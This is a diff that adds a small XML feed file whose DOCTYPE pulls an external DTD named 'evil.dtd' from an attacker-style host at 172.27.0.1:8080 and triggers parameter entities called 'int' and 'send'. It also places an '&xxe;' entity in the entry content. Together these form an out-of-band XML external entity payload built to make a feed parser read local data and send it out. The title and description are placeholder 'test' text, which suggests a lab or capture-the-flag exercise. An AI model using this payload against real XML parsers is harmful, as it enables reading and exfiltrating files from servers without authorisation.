@@ -1,0 +1,24 @@
+<!DOCTYPE feed [
+<!ENTITY % remote SYSTEM "http://172.27.0.1:8080/evil.dtd">
+%remote;%int;%send;
+]>
+<feed>
+    <title>
+    test
+    </title>
+    <description>
+	    test
+    </description>
+    <entry>
+    <title>
+    Hello
+    </title>
+   <link href="http://example.com">
+   </link>
+    <content>
+    &xxe;
+    </content>
+    </entry>
+    
+</feed>
+
